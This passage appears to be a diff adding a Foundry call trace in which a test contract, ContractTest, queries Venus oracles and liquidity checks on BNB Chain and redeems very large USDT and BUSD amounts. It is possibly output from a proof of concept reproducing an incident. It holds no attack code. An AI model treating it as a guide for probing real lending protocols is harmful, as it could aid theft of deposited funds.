+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x6592b5DE802159F3E74B2486b091D11a8256ab8A
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x6592b5DE802159F3E74B2486b091D11a8256ab8A
+    │   │   │   │   │   │   │   ├─ [15501] 0x6592b5DE802159F3E74B2486b091D11a8256ab8A::getUnderlyingPrice(vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [14932] 0xfE872ddeAe0A53486c25ed882786D592e302d80C::getUnderlyingPrice(vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   ├─ [470] vBUSD::underlying() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] BUSD: [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56]
+    │   │   │   │   │   │   │   │   │   ├─ [470] vBUSD::underlying() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] BUSD: [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56]
+    │   │   │   │   │   │   │   │   │   ├─ [10119] 0x1B2103441A0A108daD8848D8F5d790e4D402921F::getUnderlyingPrice(vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   ├─ [9550] 0xEebBfFC42e26386C631914e69B86aD398e91DD7f::getUnderlyingPrice(vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [470] vBUSD::underlying() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] BUSD: [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [425] BUSD::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [1140] 0xcBb98864Ef56E9042e7d2efef76141f15731B82f::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [298] 0x7A6BB3a3C0C99bA43564017D7523a74BA0f7cB5d::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 8
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 8
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [3143] 0xcBb98864Ef56E9042e7d2efef76141f15731B82f::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [1410] 0x7A6BB3a3C0C99bA43564017D7523a74BA0f7cB5d::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 33916 [3.391e4], 100005535 [1e8], 1687349803 [1.687e9], 1687349803 [1.687e9], 33916 [3.391e4]
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 36893488147419137148 [3.689e19], 100005535 [1e8], 1687349803 [1.687e9], 1687349803 [1.687e9], 36893488147419137148 [3.689e19]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 1000055350000000000 [1e18]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 1000055350000000000 [1e18]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 1000055350000000000 [1e18]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 1000055350000000000 [1e18]
+    │   │   │   │   │   │   │   ├─ [2774] vBNB::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0, 0, 0, 224118239498985708585930668 [2.241e26]
+    │   │   │   │   │   │   │   ├─ [1550] Unitroller::markets(vBNB: [0xA07c5b74C9B40447a954e1466938b865b6BBea36]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [855] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::markets(vBNB: [0xA07c5b74C9B40447a954e1466938b865b6BBea36]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] true, 750000000000000000 [7.5e17], true
+    │   │   │   │   │   │   │   │   └─ ← [Return] true, 750000000000000000 [7.5e17], true
+    │   │   │   │   │   │   │   ├─ [1160] Unitroller::oracle() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [492] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::oracle() [delegatecall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x6592b5DE802159F3E74B2486b091D11a8256ab8A
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x6592b5DE802159F3E74B2486b091D11a8256ab8A
+    │   │   │   │   │   │   │   ├─ [11845] 0x6592b5DE802159F3E74B2486b091D11a8256ab8A::getUnderlyingPrice(vBNB: [0xA07c5b74C9B40447a954e1466938b865b6BBea36]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [11276] 0xfE872ddeAe0A53486c25ed882786D592e302d80C::getUnderlyingPrice(vBNB: [0xA07c5b74C9B40447a954e1466938b865b6BBea36]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   ├─ [8369] 0x1B2103441A0A108daD8848D8F5d790e4D402921F::getUnderlyingPrice(vBNB: [0xA07c5b74C9B40447a954e1466938b865b6BBea36]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   ├─ [7800] 0xEebBfFC42e26386C631914e69B86aD398e91DD7f::getUnderlyingPrice(vBNB: [0xA07c5b74C9B40447a954e1466938b865b6BBea36]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [1140] 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [298] 0x137924D7C36816E0DcAF016eB617Cc2C92C05782::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 8
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 8
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [3143] 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [1410] 0x137924D7C36816E0DcAF016eB617Cc2C92C05782::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 2207163 [2.207e6], 24763280000 [2.476e10], 1687350205 [1.687e9], 1687350205 [1.687e9], 2207163 [2.207e6]
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 36893488147421310395 [3.689e19], 24763280000 [2.476e10], 1687350205 [1.687e9], 1687350205 [1.687e9], 36893488147421310395 [3.689e19]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 247632800000000000000 [2.476e20]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 247632800000000000000 [2.476e20]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 247632800000000000000 [2.476e20]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 247632800000000000000 [2.476e20]
+    │   │   │   │   │   │   │   ├─ [1162] Unitroller::vaiController() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [494] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::vaiController() [delegatecall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000004065d34c6b18ce4370ced1cebde94865dbfafe
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000004065d34c6b18ce4370ced1cebde94865dbfafe
+    │   │   │   │   │   │   │   ├─ [4310] 0x004065D34C6b18cE4370ced1CeBDE94865DbFAFE::getVAIRepayAmount(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [3639] 0x8A1e5Db8f622B97f4bCceC4684697199C1B1D11b::getVAIRepayAmount(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   ├─ [1230] Unitroller::mintedVAIs(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   ├─ [559] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::mintedVAIs(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000081d86bc29821bc83557840000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   ├─ [561] 0xcF6BB5389c92Bdda8a3747Ddb454cB7a64626C63::balanceOf(Unitroller: [0xfD36E2c2a6789Db23113685031d7F16329158384]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 14801404367740170864091001 [1.48e25]
+    │   │   │   │   │   │   ├─ [3581] vUSDT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [2145] vUSDT::delegateToImplementation(0x70a082310000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [488] 0x10FB44C481F87cb4F3ce8DE11fFd16e00EC5B670::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 82945848211975141 [8.294e16]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000126aecf3a44abe5
+    │   │   │   │   │   │   │   └─ ← [Return] 82945848211975141 [8.294e16]
+    │   │   │   │   │   │   ├─ emit DistributedSupplierVenus(param0: vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255], param1: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 0, param3: 1606131395643622516176133078929541152160241 [1.606e42])
+    │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [531] USDT::balanceOf(vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 85667293362416235809024304 [8.566e25]
+    │   │   │   │   ├─ [3080] Unitroller::treasuryPercent() [staticcall]
+    │   │   │   │   │   ├─ [2412] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::treasuryPercent() [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   ├─ [3271] USDT::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 18528422194084249665437559 [1.852e25])
+    │   │   │   │   │   ├─ emit Transfer(from: vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 18528422194084249665437559 [1.852e25])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255], value: 82945848211975141 [8.294e16])
+    │   │   │   │   ├─ emit Redeem(redeemer: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], redeemAmount: 18528422194084249665437559 [1.852e25], redeemTokens: 82945848211975141 [8.294e16])
+    │   │   │   │   ├─ [1012] Unitroller::redeemVerify(vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 18528422194084249665437559 [1.852e25], 82945848211975141 [8.294e16])
+    │   │   │   │   │   ├─ [399] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::redeemVerify(vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 18528422194084249665437559 [1.852e25], 82945848211975141 [8.294e16]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   └─ ← [Return] 
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ [162805] vBUSD::redeemUnderlying(11891269826866403367786530 [1.189e25])
+    │   │   │   ├─ [162000] 0x10FB44C481F87cb4F3ce8DE11fFd16e00EC5B670::redeemUnderlying(11891269826866403367786530 [1.189e25]) [delegatecall]
+    │   │   │   │   ├─ [531] BUSD::balanceOf(vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 23905043702920857656875424 [2.39e25]
+    │   │   │   │   ├─ [120022] Unitroller::redeemAllowed(vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 53675881533888187 [5.367e16])
+    │   │   │   │   │   ├─ [119332] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::redeemAllowed(vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 53675881533888187 [5.367e16]) [delegatecall]
+    │   │   │   │   │   │   ├─ [103576] 0x50F618A2EAb0fB55e87682BbFd89e38acb2735cD::getHypotheticalAccountLiquidity(Unitroller: [0xfD36E2c2a6789Db23113685031d7F16329158384], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D], 53675881533888187 [5.367e16], 0) [staticcall]
+    │   │   │   │   │   │   │   ├─ [2312] Unitroller::getAssetsIn(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [1593] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::getAssetsIn(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] [0xfD5840Cd36d94D7229439859C0112a4185BC0255, 0x95c78222B3D6e262426483D42CfA53685A67Ab9D, 0xA07c5b74C9B40447a954e1466938b865b6BBea36]
+    │   │   │   │   │   │   │   │   └─ ← [Return] [0xfD5840Cd36d94D7229439859C0112a4185BC0255, 0x95c78222B3D6e262426483D42CfA53685A67Ab9D, 0xA07c5b74C9B40447a954e1466938b865b6BBea36]
+    │   │   │   │   │   │   │   ├─ [7074] vUSDT::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [5549] vUSDT::delegateToImplementation(0xc37f68e20000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496) [staticcall]
+    │   │   │   │   │   │   │   │   │   ├─ [3664] 0x10FB44C481F87cb4F3ce8DE11fFd16e00EC5B670::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   ├─ [531] USDT::balanceOf(vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 67138871168331986143586745 [6.713e25]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0, 0, 0, 223379742247415412272871317 [2.233e26]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000b8c680177952a8b2333795
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0, 0, 0, 223379742247415412272871317 [2.233e26]
+    │   │   │   │   │   │   │   ├─ [1550] Unitroller::markets(vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [855] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::markets(vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] true, 800000000000000000 [8e17], true
+    │   │   │   │   │   │   │   │   └─ ← [Return] true, 800000000000000000 [8e17], true
+    │   │   │   │   │   │   │   ├─ [1160] Unitroller::oracle() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [492] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::oracle() [delegatecall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x6592b5DE802159F3E74B2486b091D11a8256ab8A
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x6592b5DE802159F3E74B2486b091D11a8256ab8A
+    │   │   │   │   │   │   │   ├─ [15501] 0x6592b5DE802159F3E74B2486b091D11a8256ab8A::getUnderlyingPrice(vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [14932] 0xfE872ddeAe0A53486c25ed882786D592e302d80C::getUnderlyingPrice(vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   ├─ [470] vUSDT::underlying() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] USDT: [0x55d398326f99059fF775485246999027B3197955]
+    │   │   │   │   │   │   │   │   │   ├─ [470] vUSDT::underlying() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] USDT: [0x55d398326f99059fF775485246999027B3197955]
+    │   │   │   │   │   │   │   │   │   ├─ [10119] 0x1B2103441A0A108daD8848D8F5d790e4D402921F::getUnderlyingPrice(vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   ├─ [9550] 0xEebBfFC42e26386C631914e69B86aD398e91DD7f::getUnderlyingPrice(vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [470] vUSDT::underlying() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] USDT: [0x55d398326f99059fF775485246999027B3197955]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [425] USDT::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [1140] 0xB97Ad0E74fa7d920791E90258A6E2085088b4320::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [298] 0x2dc202b56A03667cC240B290c2BE2b8453E89eA1::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 8
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 8
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [3143] 0xB97Ad0E74fa7d920791E90258A6E2085088b4320::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [1410] 0x2dc202b56A03667cC240B290c2BE2b8453E89eA1::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 34996 [3.499e4], 99995000 [9.999e7], 1687349434 [1.687e9], 1687349434 [1.687e9], 34996 [3.499e4]
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 36893488147419138228 [3.689e19], 99995000 [9.999e7], 1687349434 [1.687e9], 1687349434 [1.687e9], 36893488147419138228 [3.689e19]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 999950000000000000 [9.999e17]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 999950000000000000 [9.999e17]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 999950000000000000 [9.999e17]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 999950000000000000 [9.999e17]
+    │   │   │   │   │   │   │   ├─ [7074] vBUSD::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [5549] vBUSD::delegateToImplementation(0xc37f68e20000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496) [staticcall]
+    │   │   │   │   │   │   │   │   │   ├─ [3664] 0x10FB44C481F87cb4F3ce8DE11fFd16e00EC5B670::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   ├─ [531] BUSD::balanceOf(vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 23905043702920857656875424 [2.39e25]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0, 53675881533888187 [5.367e16], 0, 221538417014331993455068123 [2.215e26]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000beb1ee0bd556bb0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000b74095a69aa07cc5f403db
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0, 53675881533888187 [5.367e16], 0, 221538417014331993455068123 [2.215e26]
+    │   │   │   │   │   │   │   ├─ [1550] Unitroller::markets(vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [855] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::markets(vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] true, 825000000000000000 [8.25e17], true
+    │   │   │   │   │   │   │   │   └─ ← [Return] true, 825000000000000000 [8.25e17], true
+    │   │   │   │   │   │   │   ├─ [1160] Unitroller::oracle() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [492] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::oracle() [delegatecall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x6592b5DE802159F3E74B2486b091D11a8256ab8A
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x6592b5DE802159F3E74B2486b091D11a8256ab8A
+    │   │   │   │   │   │   │   ├─ [15501] 0x6592b5DE802159F3E74B2486b091D11a8256ab8A::getUnderlyingPrice(vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [14932] 0xfE872ddeAe0A53486c25ed882786D592e302d80C::getUnderlyingPrice(vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   ├─ [470] vBUSD::underlying() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] BUSD: [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56]
+    │   │   │   │   │   │   │   │   │   ├─ [470] vBUSD::underlying() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] BUSD: [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56]
+    │   │   │   │   │   │   │   │   │   ├─ [10119] 0x1B2103441A0A108daD8848D8F5d790e4D402921F::getUnderlyingPrice(vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   ├─ [9550] 0xEebBfFC42e26386C631914e69B86aD398e91DD7f::getUnderlyingPrice(vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [470] vBUSD::underlying() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] BUSD: [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [425] BUSD::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [1140] 0xcBb98864Ef56E9042e7d2efef76141f15731B82f::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [298] 0x7A6BB3a3C0C99bA43564017D7523a74BA0f7cB5d::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 8
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 8
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [3143] 0xcBb98864Ef56E9042e7d2efef76141f15731B82f::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [1410] 0x7A6BB3a3C0C99bA43564017D7523a74BA0f7cB5d::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 33916 [3.391e4], 100005535 [1e8], 1687349803 [1.687e9], 1687349803 [1.687e9], 33916 [3.391e4]
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 36893488147419137148 [3.689e19], 100005535 [1e8], 1687349803 [1.687e9], 1687349803 [1.687e9], 36893488147419137148 [3.689e19]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 1000055350000000000 [1e18]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 1000055350000000000 [1e18]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 1000055350000000000 [1e18]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 1000055350000000000 [1e18]
+    │   │   │   │   │   │   │   ├─ [2774] vBNB::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0, 0, 0, 224118239498985708585930668 [2.241e26]
+    │   │   │   │   │   │   │   ├─ [1550] Unitroller::markets(vBNB: [0xA07c5b74C9B40447a954e1466938b865b6BBea36]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [855] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::markets(vBNB: [0xA07c5b74C9B40447a954e1466938b865b6BBea36]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] true, 750000000000000000 [7.5e17], true
+    │   │   │   │   │   │   │   │   └─ ← [Return] true, 750000000000000000 [7.5e17], true
+    │   │   │   │   │   │   │   ├─ [1160] Unitroller::oracle() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [492] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::oracle() [delegatecall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x6592b5DE802159F3E74B2486b091D11a8256ab8A
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x6592b5DE802159F3E74B2486b091D11a8256ab8A
+    │   │   │   │   │   │   │   ├─ [11845] 0x6592b5DE802159F3E74B2486b091D11a8256ab8A::getUnderlyingPrice(vBNB: [0xA07c5b74C9B40447a954e1466938b865b6BBea36]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [11276] 0xfE872ddeAe0A53486c25ed882786D592e302d80C::getUnderlyingPrice(vBNB: [0xA07c5b74C9B40447a954e1466938b865b6BBea36]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   ├─ [8369] 0x1B2103441A0A108daD8848D8F5d790e4D402921F::getUnderlyingPrice(vBNB: [0xA07c5b74C9B40447a954e1466938b865b6BBea36]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   ├─ [7800] 0xEebBfFC42e26386C631914e69B86aD398e91DD7f::getUnderlyingPrice(vBNB: [0xA07c5b74C9B40447a954e1466938b865b6BBea36]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [1140] 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [298] 0x137924D7C36816E0DcAF016eB617Cc2C92C05782::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 8
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 8
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [3143] 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [1410] 0x137924D7C36816E0DcAF016eB617Cc2C92C05782::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 2207163 [2.207e6], 24763280000 [2.476e10], 1687350205 [1.687e9], 1687350205 [1.687e9], 2207163 [2.207e6]
